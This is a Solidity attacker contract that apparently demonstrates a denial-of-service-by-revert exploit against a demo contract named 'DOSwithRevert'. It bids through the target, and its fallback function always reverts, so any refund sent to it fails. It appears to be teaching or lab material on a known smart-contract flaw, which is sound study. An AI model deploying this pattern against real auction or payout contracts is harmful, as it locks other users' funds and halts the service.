// Imports and Pragma
contract R1A{
    
    DOSwithRevert dwr;
    
    function setAddress(address _addr)
    public{
        dwr = DOSwithRevert(_addr);
    }
    
    function callBid() 
    public payable{
         dwr.bid.value(address(this).balance)();
    }
    function inV() public {
        dwr.increaseVal();
    }
    function addBal() public payable{
        
    }
    function getContractBalance() 
    public
    view returns(uint){
        return address(this).balance;
    }
    function() payable external{
        require(msg.value < 0);
    }
}